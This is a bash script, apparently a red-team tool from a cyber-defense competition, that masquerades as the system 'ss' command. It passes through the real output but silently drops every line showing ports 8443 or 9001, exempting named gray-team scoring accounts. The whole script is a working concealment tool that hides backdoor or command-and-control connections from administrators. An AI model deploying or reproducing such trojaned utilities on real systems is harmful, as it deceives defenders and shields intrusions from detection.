#!/bin/bash
REAL_SS="$(command -v /usr/sbin/ss 2>/dev/null || command -v /usr/bin/ss 2>/dev/null || echo /usr/sbin/ss)"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_SS "$@" ;;
esac

TMP_OUT=$("$REAL_SS" "$@" 2>&1)
RC=$?

while IFS= read -r line; do
    if echo "$line" | grep -qE ":(8443|9001) "; then
        :
    else
        echo "$line"
    fi
done <<< "$TMP_OUT"

exit $RC
